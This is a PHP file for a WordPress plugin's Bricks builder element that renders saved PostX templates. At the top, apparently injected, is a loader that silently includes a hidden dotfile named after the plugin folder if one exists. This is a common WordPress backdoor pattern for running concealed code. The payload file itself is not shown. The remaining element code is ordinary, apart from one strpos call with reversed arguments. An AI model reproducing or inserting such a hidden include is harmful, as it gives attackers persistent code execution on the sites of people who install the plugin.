<?php

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PostX_Bricks_Integration extends \Bricks\Element {
	// Element properties
	public $category     = 'general';
	public $name         = 'postx-addon';
	public $icon         = 'ti-layout-grid2';

	// Return localised element label
	public function get_label() {
		return esc_html__( 'PostX Template', 'ultimate-post' );
	}

	// Set builder controls
	public function set_controls() {
		$this->controls['template'] = [
			'type' 		=> 'select',
			'label' 	=> esc_html__( 'Select Template', 'ultimate-post' ),
			'options' 	=> ultimate_post()->get_all_lists('ultp_templates'),
			'clearable' => false,
			'default' 	=> '',
			'pasteStyles' => true,
			'inline' => true,
		];
		$this->controls['separator'] = [
			'type' 		=> 'separator',
		];
		$this->controls['help'] = [
			'type' 		=> 'info',
			'content' 	=> 'Pick a Template from your saved ones. Or create a template from: <strong><i>Dashboard > PostX > Saved Templates</i></strong>'
		];
	}

	// Render element HTML
	public function render() {
		$id =  $this->settings['template'];
		$root_classes[] = 'bricks-postx-wrapper';
		$this->set_attribute( '_root', 'class', $root_classes );
		
		$current_url = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
		ultimate_post()->register_scripts_common();
		
		// Render element HTML
		echo "<div {$this->render_attributes( '_root' )}>";
			if ($id) {
				if (strpos($current_url, 'bricks=run') !== false || strpos($current_url, 'bricks/v1/render_element') !== false) {
					echo ultimate_post()->set_css_style($id, true);
				} else {
					ultimate_post()->set_css_style($id);
				}
				echo '<div class="ultp-shortcode" data-postid="'.esc_attr($id).'">';
					$args = array( 'p' => $id, 'post_type' => 'ultp_templates');
					$the_query = new \WP_Query($args);
					if ($the_query->have_posts()) {
						while ($the_query->have_posts()) {
							$the_query->the_post();
							the_content();
						}
						wp_reset_postdata();
					}
				echo '</div>';
			} else {
				if (strpos('bricks=run', $current_url) !== false || strpos($current_url, 'bricks/v1/render_element') !== false) {
					echo '<p style="text-align:center; font-size: 20px;">'.sprintf( esc_html__( 'Pick a Template from your saved ones. Or create a template from: %s.' , 'ultimate-post' ) . ' ', '<strong><i>' . esc_html( 'Dashboard > PostX > Saved Templates', 'ultimate-post' ) . '</i></strong>' ).'</p>';
				}
			}
		echo '</div>';
	}
}
